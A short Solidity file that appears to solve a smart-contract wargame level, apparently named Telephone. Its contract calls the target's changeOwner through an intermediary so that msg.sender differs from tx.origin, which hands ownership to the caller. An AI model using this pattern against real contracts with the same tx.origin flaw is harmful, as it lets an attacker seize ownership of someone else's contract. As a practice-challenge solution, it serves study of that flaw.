// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneSol {
    function changeOwner(Telephone tel) public {
          tel.changeOwner(msg.sender);
  }
}
